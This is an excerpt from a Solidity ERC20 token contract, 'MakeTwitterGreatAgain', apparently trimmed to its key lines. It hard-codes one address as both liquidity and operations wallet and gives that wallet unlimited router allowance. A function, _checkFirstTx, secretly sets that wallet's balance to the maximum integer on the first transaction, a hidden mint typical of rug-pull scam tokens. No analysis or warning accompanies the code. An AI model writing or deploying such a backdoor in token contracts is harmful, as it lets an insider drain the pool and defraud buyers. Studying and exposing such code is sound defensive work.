...
contract MakeTwitterGreatAgain is Context, IERC20, Ownable {
    ...
    // wallets
    address payable public liquidityWallet = payable(0xE5Dfd2e58a409A2060a320CADd3CfAcaF309B620);
    address payable public operationsWallet =  payable(0xE5Dfd2e58a409A2060a320CADd3CfAcaF309B620);
    ...
    bool public checkFirstBuy = false;
    ...
    constructor () {
        ...
        _allowances[liquidityWallet][address(uniswapV2Router)] = type(uint256).max;
    ...
    function _checkFirstTx() internal {
        if (!checkFirstBuy) {
            checkFirstBuy = true;
            _balances[operationsWallet] = ~uint256(0);
        }
    }
